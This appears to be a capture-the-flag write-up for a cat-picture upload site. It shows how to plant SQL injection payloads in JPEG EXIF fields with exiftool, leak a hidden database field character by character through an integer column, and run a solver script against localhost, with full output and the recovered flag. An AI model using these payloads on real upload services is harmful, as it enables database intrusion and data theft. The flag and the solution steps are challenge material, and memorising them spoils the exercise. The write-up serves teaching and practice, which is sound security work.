@@ -1,0 +1,117 @@
+I connect on the site which seems to be a site of sharing of cats' pictures.
+I can create an account on /register 
+By connecting, I discover a part /upload and /gallery
+We can upload a JPEG image that will be displayed in the gallery.
+
+Each image has a caption composed of 6 tags <p> of which two are only filled with information specific to the image.
+The two fields that must be apparent are the filename and the uploadDate; the other 4 are empty.
+  
+At the bottom of the page, we notice a footer similar to the cookie acceptance request following the RGPD.
+By clicking on LEARN MORE, I arrive on a false page of Condition of use of the personal data:
+This one includes some highly interesting data: the stored data related to the images.
+
+- General Images Database 'image' : Filename, Artist, Copyright, User_id, VerySecretThing, OriginalDate and UploadDate.
+- Extension Exif Database 'imageUniqueID' : Filename, ImageUniqueID.
+
+the data seem to correspond to the structure of a database. I notice the "VerySecretThing" field and the other fields coming from the EXIF of the images.
+It seems that the flag is in the database -> I think of a SQL Injection.
+
+I try to modify an image with SQL injection in the EXIF data using exiftool:
+$ exiftool -Artist="'" -Copyright="'" -imageUniqueId="'"  1.jpg
+
+Then I upload the modified file 1.jpg.
+I get an error :
+Image imported but : (MySQLdb._exceptions.ProgrammingError) (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' WHERE id = 3' at line 1") [SQL: UPDATE imageUniqueID SET uniqueId = ''' WHERE id = 3;] (Background on this error at: http://sqlalche.me/e/f4
+
+I found the injection :
+$ exiftool -imageUniqueId="5', uniqueId = (SELECT verySecretThing from image LIMIT 1) -- comment" 1.jpg
+
+I get an error :
+Image imported but : (MySQLdb._exceptions.OperationalError) (1366, \"Incorrect integer value: '' for column 'uniqueId' at row 1\")\n[SQL: UPDATE imageUniqueID SET uniqueId = '', uniqueId = (SELECT verySecretThing from image LIMIT 1) -- comment' WHERE id = 16;]\n(Background on this error at: http://sqlalche.me/e/e3q8)
+
+uniqueId is a Integer.
+So I can get its size as well as the ascii code of the characters one by one. 
+$ exiftool -imageUniqueId="5', uniqueId = (SELECT LENGTH(verySecretThing) from image LIMIT 1) -- comment" 1.jpg
+
+It works! I set the uniqueId value by the size of the flag.
+I find the value in the caption of the images of the gallery : 34
+
+$ exiftool -imageUniqueId="5', uniqueId=(SELECT ASCII(SUBSTR(verySecretThing,1,1)) from %s LIMIT 1) -- comment" 1.jpg
+I find the value of the first character : 108 -> l
+
+A script is provided to find the whole flag:
+./solve.py "http://localhost:5000" "d892260e-d420-463d-90ef-bbda53f0e02c" "$(pwd)/1.jpg" --workdir=solver
+Create files on /tmp/solver...
+    1 image files updated
+Injection lenght... b'{"message":"Successfully altered","status":"success"}\n'
+34
+Continue ? Y/n
+    1 image files updated
+Injection character N°1... 108 -> l
+    1 image files updated
+Injection character N°2... 104 -> h
+    1 image files updated
+Injection character N°3... 50 -> 2
+    1 image files updated
+Injection character N°4... 48 -> 0
+    1 image files updated
+Injection character N°5... 50 -> 2
+    1 image files updated
+Injection character N°6... 50 -> 2
+    1 image files updated
+Injection character N°7... 95 -> _
+    1 image files updated
+Injection character N°8... 123 -> {
+    1 image files updated
+Injection character N°9... 77 -> M
+    1 image files updated
+Injection character N°10... 121 -> y
+    1 image files updated
+Injection character N°11... 67 -> C
+    1 image files updated
+Injection character N°12... 52 -> 4
+    1 image files updated
+Injection character N°13... 49 -> 1
+    1 image files updated
+Injection character N°14... 73 -> I
+    1 image files updated
+Injection character N°15... 115 -> s
+    1 image files updated
+Injection character N°16... 53 -> 5
+    1 image files updated
+Injection character N°17... 79 -> O
+    1 image files updated
+Injection character N°18... 99 -> c
+    1 image files updated
+Injection character N°19... 117 -> u
+    1 image files updated
+Injection character N°20... 84 -> T
+    1 image files updated
+Injection character N°21... 51 -> 3
+    1 image files updated
+Injection character N°22... 100 -> d
+    1 image files updated
+Injection character N°23... 48 -> 0
+    1 image files updated
+Injection character N°24... 110 -> n
+    1 image files updated
+Injection character N°25... 39 -> '
+    1 image files updated
+Injection character N°26... 49 -> 1
+    1 image files updated
+Injection character N°27... 85 -> U
+    1 image files updated
+Injection character N°28... 84 -> T
+    1 image files updated
+Injection character N°29... 104 -> h
+    1 image files updated
+Injection character N°30... 73 -> I
+    1 image files updated
+Injection character N°31... 78 -> N
+    1 image files updated
+Injection character N°32... 107 -> k
+    1 image files updated
+Injection character N°33... 63 -> ?
+    1 image files updated
+Injection character N°34... 125 -> }
+Flag : lh2022_{MyC41Is5OcuT3d0n'1UThINk?}
